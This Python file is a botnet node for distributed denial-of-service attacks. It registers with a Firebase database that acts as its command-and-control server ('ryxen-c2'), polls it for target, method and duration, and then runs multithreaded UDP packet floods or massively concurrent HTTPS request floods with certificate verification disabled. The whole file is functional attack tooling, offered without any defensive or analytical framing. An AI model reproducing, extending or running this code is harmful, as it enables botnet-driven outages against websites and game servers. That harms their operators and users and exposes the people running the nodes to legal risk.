import asyncio, aiohttp, time, random, ssl, socket, threading

DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
NODES_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/nodes"

async def get_node_info():
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get('http://ip-api.com/json/', timeout=5) as r:
                data = await r.json()
                return data.get('query', '0.0.0.0'), data.get('countryCode', 'UN')
    except: return "0.0.0.0", "UN"

def udp_engine(target_ip, target_port, end_time):
    # Payload de 1024 bytes para maximizar el ancho de banda (Gbps)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_data = random._urandom(1024) 
    while time.time() < end_time:
        try:
            sock.sendto(packet_data, (target_ip, int(target_port)))
        except: pass

async def l7_engine(target, end_time, sem):
    ctx = ssl.create_default_context()
    ctx.check_hostname, ctx.verify_mode = False, ssl.CERT_NONE
    # Connector optimizado para miles de conexiones
    conn = aiohttp.TCPConnector(limit=0, ssl=ctx, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=conn) as session:
        while time.time() < end_time:
            async with sem:
                try:
                    headers = {'User-Agent': f'Ryxen-V21-{random.randint(1000,9999)}', 'Connection': 'keep-alive'}
                    async with session.get(target, headers=headers, timeout=1, allow_redirects=False) as r:
                        r.close()
                except: continue

async def main():
    ip, cc = await get_node_info()
    nid = f"RX-{cc}-{random.randint(100,999)}"
    sem = asyncio.Semaphore(15000) # Límite masivo de concurrencia
    
    async with aiohttp.ClientSession() as session:
        await session.put(f"{NODES_URL}/{nid}.json", json={"id": nid, "ip": ip, "cc": cc, "t": time.time()})
        last_s = ""
        
        while True:
            try:
                async with session.get(DB_URL, timeout=5) as r:
                    data = await r.json()
                if data and data.get('stamp') != last_s:
                    last_s = data['stamp']
                    method, target, duration = data['method'], data['target'], int(data['time'])
                    if duration <= 0: continue

                    end_attack = time.time() + duration
                    if ".udp" in method or ".samp" in method:
                        host, port = target.split(':')
                        # 200 hilos reales para saturar los 2Gbps de la runner
                        for _ in range(200):
                            threading.Thread(target=udp_engine, args=(host, port, end_attack), daemon=True).start()
                    else:
                        # 200 tareas asíncronas masivas
                        tasks = [l7_engine(target, end_attack, sem) for _ in range(200)]
                        asyncio.create_task(asyncio.gather(*tasks))
            except: pass
            await asyncio.sleep(1.5)

if __name__ == "__main__":
    asyncio.run(main())
                                         
